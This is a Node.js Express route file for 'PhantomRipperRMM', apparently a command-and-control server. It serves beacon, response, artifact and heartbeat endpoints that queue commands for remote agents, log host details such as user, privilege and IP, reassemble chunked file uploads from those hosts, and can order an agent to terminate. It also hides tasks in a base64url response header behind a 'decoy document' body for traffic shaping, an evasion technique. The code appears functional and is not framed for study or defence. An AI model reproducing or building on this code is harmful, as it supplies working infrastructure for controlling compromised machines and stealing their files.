'use strict';

/**
 * PhantomRipperRMM — agent-facing beacon routes.
 *
 *   POST /api/beacon    { session_id, info:{...} }  ->  { command, task? }
 *   POST /api/response  { session_id, command, output, task_id? }
 *   POST /api/artifact  { session_id, task_id?, kind, name, seq, total, data(b64) }
 *   POST /api/heartbeat { session_id }
 *
 * Structured task protocol: agents that register `caps` in their beacon info
 * receive `{command:"<flattened>", task:{task_id, verb, args}}` and answer
 * `/api/response` with `task_id` so results correlate to their task row.
 * Legacy agents keep the plain string protocol untouched.
 */

const express = require('express');
const sessions = require('../sessionManager');
const ws = require('../ws');

const router = express.Router();

// Chunk assembly state for artifact uploads (session -> key -> {parts,total})
const pendingChunks = new Map();

function parseMaybeJson(command) {
  if (typeof command !== 'string' || !command.startsWith('{')) return null;
  try {
    const obj = JSON.parse(command);
    return obj && obj.task_id && obj.verb ? obj : null;
  } catch (_) {
    return null;
  }
}

router.post('/beacon', async (req, res) => {
  try {
    const data = req.body || {};
    const sessionId = data.session_id || data.sessionId;
    if (!sessionId) return res.status(400).json({ error: 'session_id required' });

    if (data.first === false && (await sessions.isDeleted(sessionId))) {
      return res.json({ command: '__TERMINATE__' });
    }

    const info = data.info || {};
    const caps = Array.isArray(info.caps) ? info.caps : null;
    // Proto is sticky: an agent that ever registered as task-protocol keeps
    // that status even on thin beacons that omit caps.
    const existing = await sessions.getSession(sessionId);
    const proto = caps ? 'task'
      : info.proto === 'task' ? 'task'
      : existing?.proto === 'task' ? 'task'
      : 'legacy';
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || null;

    const isNew = await sessions.upsertSession({
      id: sessionId,
      hostname: info.hostname,
      username: info.username,
      os: info.os,
      arch: info.arch,
      pid: info.pid,
      ip,
      privilege: info.privilege,
      agent_type: info.agent_type || 'python',
      proto,
      caps,
    });

    ws.bus.emit('event', { type: 'session_update', payload: { sessionId, info, isNew } });

    const next = proto === 'task' ? await sessions.nextTask(sessionId) : await sessions.nextCommand(sessionId);

    // Header-carry profiles: agents that beacon with info.hdr=1 also receive
    // the task base64url-encoded in a response header, so the body can be a
    // decoy document for malleable traffic shaping.
    if (next && info.hdr === 1) {
      const blob = Buffer.from(JSON.stringify(next.task || { command: next.command }), 'utf8')
        .toString('base64url');
      res.set('X-Update', blob.slice(0, 3500));
    }

    const command = next ? (next.command ?? next) : null;
    res.json({ command: command || null, task: (next && next.task) || null });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error('[beacon]', err.message);
    res.status(500).json({ error: 'beacon error' });
  }
});

router.post('/response', async (req, res) => {
  try {
    const data = req.body || {};
    const sessionId = data.session_id || data.sessionId;
    const { command } = data;
    let output = data.output ?? data.response ?? '';
    const taskId = data.task_id || null;

    if (!sessionId || command === undefined) {
      return res.status(400).json({ error: 'session_id and command required' });
    }

    if (data.encoding === 'base64') {
      try { output = Buffer.from(output, 'base64').toString('utf8'); } catch (_) { /* keep */ }
    }

    if (taskId) {
      await sessions.completeTask(taskId, output, !!data.error);
    } else {
      await sessions.saveResponse(sessionId, command, output);
    }
    await sessions.touchSession(sessionId);
    ws.bus.emit('event', { type: 'command_result', payload: { sessionId, command, output, task_id: taskId } });
    res.json({ status: 'ok' });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error('[response]', err.message);
    res.status(500).json({ error: 'response error' });
  }
});

router.post('/artifact', async (req, res) => {
  try {
    const data = req.body || {};
    const sessionId = data.session_id || data.sessionId;
    if (!sessionId || !data.data) {
      return res.status(400).json({ error: 'session_id and data required' });
    }
    if (!(await sessions.getSession(sessionId))) {
      return res.status(404).json({ error: 'unknown session' });
    }

    const total = Math.max(1, parseInt(data.total || '1', 10));
    const seq = Math.max(0, parseInt(data.seq || '0', 10));
    const name = data.name || 'artifact.bin';
    const key = `${sessionId}|${data.task_id || '-'}|${name}`;
    let entry = pendingChunks.get(key);
    if (!entry) {
      entry = { parts: new Array(total).fill(null), total, received: 0, started: Date.now() };
      pendingChunks.set(key, entry);
    }
    let buf;
    try {
      buf = Buffer.from(String(data.data), 'base64');
    } catch (_) {
      return res.status(400).json({ error: 'data must be base64' });
    }
    if (!entry.parts[seq]) entry.received += 1;
    entry.parts[seq] = buf;

    if (entry.received < total) {
      return res.json({ status: 'partial', received: entry.received, total });
    }

    const buffer = Buffer.concat(entry.parts.filter(Boolean));
    pendingChunks.delete(key);
    const meta = await sessions.saveArtifact({
      sessionId,
      taskId: data.task_id || null,
      kind: data.kind || 'file',
      name,
      buffer,
    });
    ws.bus.emit('event', { type: 'artifact_new', payload: meta });
    res.json({ status: 'ok', artifact: meta });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error('[artifact]', err.message);
    res.status(500).json({ error: 'artifact error' });
  }
});

router.post('/heartbeat', async (req, res) => {
  const { session_id: sessionId } = req.body || {};
  if (sessionId) await sessions.touchSession(sessionId);
  res.json({ status: 'ok' });
});

module.exports = router;
